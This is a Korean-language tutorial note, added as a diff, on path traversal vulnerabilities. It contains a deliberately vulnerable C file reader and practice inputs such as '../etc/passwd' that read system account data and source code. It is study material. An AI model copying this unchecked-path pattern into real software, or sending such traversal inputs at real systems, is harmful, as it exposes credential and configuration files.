@@ -1,0 +1,138 @@
+Path Traversal :
+    Path Traversal은 프로그래머가 가정한 디렉토리를 벗어나 외부에 존재하는 파일에 접근할 수 있는 취약점입니다.
+    리눅스의 계정 정보, 서비스의 설정 파일을 읽어 작업 디렉토리를 알아낼 수 있다면 소스 코드 유출, 계정 정보 유출 등으로 이어질 수 있기 때문에 매우 위험합니다.
+
+    ex)
+        // gcc -o path_traversal path_traversal.c
+        #include <stdlib.h>
+        #include <unistd.h>
+        #include <stdio.h>
+        #include <string.h>
+        int main()
+        {
+            char path[256] = "/tmp/";
+            char file_buf[10240];
+            char filename[256] = {0,};
+            char cmd[256] = {0,};
+            
+            int len;
+            FILE *fp;
+            
+            printf("Filename: ");
+            fflush(stdout);
+            
+            len = read(0, filename, sizeof(filename)-1);
+            filename[len-1] = '\0';
+            
+            strncat(path, filename, sizeof(path)-1);
+            
+            fp = fopen(path, "r");
+            
+            if(!fp) {
+                return -1;
+            }
+            
+            fread(file_buf, 1, sizeof(file_buf), fp);
+            printf("%s\n", file_buf);
+            fclose(fp);
+            return 0;
+        }
+
+    path_traversal.c에서 path 변수는 선언되면서 "/tmp/" 문자열로 초기화됩니다.
+    그리고 read 함수를 통해 입력받은 filename을 strncat 함수로 path 변수에 복사합니다.
+    fopen 함수의 인자로 복사한 path 변수가 전달되고 파일이 존재한다면 해당 파일을 읽고 출력합니다.
+    그러나 코드에는 .과 /와 같이 상위 디렉토리로 이동하는 문자들에 대한 검증이 존재하지 않기 때문에
+    공격자는 /tmp 디렉토리를 벗어나 다른 파일들을 읽어낼 수 있습니다.
+
+실습 :
+    Path List
+
+    etc
+        ㄴ passwd
+        ㄴ host
+        ㄴ issue
+    home
+        ㄴ theori
+            ㄴ path_traversal.c
+    tmp
+        ㄴ upload.txt
+
+    입력 :
+        Path > upload.txt
+        
+        Full path: /tmp/upload.txt
+                
+                dreamhack
+
+    Test 입력 :
+    Path > ../etc/passwd
+        Full path: /etc/passwd
+                    root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+        sync:x:4:65534:sync:/bin:/bin/sync
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
+    다음은 상위 디렉토리로 이동할 수 있는 "../"를 사용해서 /etc/passwd 파일을 읽어 각 계정의 홈 디렉토리를 알아낸 후, 소스 코드를 읽어낸 모습입니다.
+    ex)
+        $ ./path_traversal 
+        Filename: ../etc/passwd
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        theori:1001:1001::/home/theori:/bin/bash
+
+    ex)
+        $ ./path_traversal 
+        Filename: ../home/theori/path_traversal.c
+        // gcc -o path_traversal path_traversal.c
+        #include <stdlib.h>
+        #include <unistd.h>
+        #include <stdio.h>
+        #include <string.h>
+        int main()
+        {
+            char path[256] = "/tmp/";
+            char file_buf[10240];
+            char filename[256] = {0,};
+            char cmd[256] = {0,};
+            
+            int len;
+            FILE *fp;
+            printf("Filename: ");
+            fflush(stdout);
+            len = read(0, filename, sizeof(filename)-1);
+            filename[len-1] = '\0';
+            strncat(path, filename, sizeof(path)-1);
+            fp = fopen(path, "r");
+            if(!fp) {
+                return -1;
+            }
+            fread(file_buf, 1, sizeof(file_buf), fp);
+            printf("%s\n", file_buf);
+            fclose(fp);
+            return 0;
+        }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
